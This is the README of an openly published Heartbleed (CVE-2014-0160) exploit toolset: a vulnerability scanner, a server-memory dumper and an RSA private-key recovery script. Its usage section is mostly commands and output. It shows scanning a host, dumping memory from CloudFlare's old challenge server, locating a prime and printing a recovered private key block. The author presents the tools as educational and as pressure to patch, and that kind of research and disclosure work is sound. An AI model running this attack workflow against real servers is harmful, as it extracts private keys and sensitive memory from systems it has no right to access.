## OpenSSL Heartbleed (CVE-2014-0160) vulnerability scanner, data miner and RSA key-restore tools.

Author: Einar Otto Stangvik / @einaros / https://hacking.ventures

Since the cat is long since out of the bag, and others have begun publishing their tools,
I'm putting mine out there too. Hopefully this amplifies the pressure on those that still
haven't patched or upgraded their severs. Others may find the tools of educational value.

Unlike many other Heartbleed PoCs, this tool will supply most possible ciphers in the initial
ClientHello packet. Whatever cipher the server picks will be used for all subsequent ClientHello
packets in a dump session. That should ensure proper vulnerability detection, as well as
decrease overhead once a cipher has been found.

Use these tools as you please, but do us all a favor: Solve problems instead of creating them.

Inspired by the work and publications of:
- Jared Stafford
- Jeremi M Gosney
- Ben M Murphy 
- ... and many others.

### Usage:

Here seen recovering one of the RSA primes of the CloudFlare challenge 34 times in one minute. That equals getting the full private key 34 times in one minute.
![img](https://i.imgur.com/zfEBObE.png)

```
# Test vulnerability
$ ./hb.py -p 4433 localhost
localhost:4433 is vulnerable

# Dupm data from CloudFlare's old challenge server
$ ./hb.py -p 443 www.cloudflarechallenge.com -n 0xF000 -l 100 -t 50 -d -o cloudflare-dump.bin
[2014/04/14 10:55:48] Incoming data rate: 85877 kbps
... runs for a while

# Look for prime in the dump
$ ./keyscan.py cloudflare.crt cloudflare-dump.bin
Key size: 128
Data length: 173476834
cloudflare-dump.bin Offset 0xf155ec: p = 13827796798740740191625032142481917804987720337701...

# Extract key once found
$ ./keyscan.py cloudflare.crt cloudflare-dump.bin 0xf155ec
Prime should be at offset: f155ec
Key size: 128

Hexdump of surrounding data:
f151ec: D0 00 00 00 00 00 00 00 00 00 00 00 00 00 30 C0  ..............0.
f151fc: 3C 01 00 00 00 00 00 00 00 00 00 00 00 00 90 8B  <...............
f1520c: D0 00 00 00 00 00 02 00 C3 A3 4D 08 48 47 00 00  ..........M.HG..
...

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAm0AWkVnDx5feOctdC97Ztgvtd25uKKmhjCHpLycmExe1RiRSl/hGIL7f8Fg/
qiUztVm5uXZJ1UG7dzz+9OtTNh+v27BtzPsU3yivHevwAB1mTMtP6bPuXBjzsxRcC9yVcBBWpKBM
...
```

### License

The author can't and won't hold any right to any part of this package. It's based on open ideas,
and shall remain open for all he cares.
